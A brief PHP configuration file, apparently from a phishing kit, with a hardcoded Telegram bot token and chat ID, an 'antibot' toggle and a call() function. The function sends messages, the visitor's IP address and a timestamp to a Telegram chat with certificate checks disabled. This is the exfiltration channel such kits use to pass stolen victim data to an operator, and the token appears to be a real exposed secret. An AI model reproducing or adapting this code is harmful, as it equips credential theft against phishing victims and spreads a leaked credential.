<?php 

//Have a telegram bot? put the tokens here :D
$token = "7042139410:AAFYthOscsFQHTWJ5CjnO896BLz_nzEk3Fc";
$id = "790446298";

 
//use antibots? - on | off
$antibot = "on";


// delay of waiting in seconds
$seconds = 7;



function call($msg){
    global $token;
    global $id;
    $info = "

/- MORE INFO -/
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");

    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}
 


?>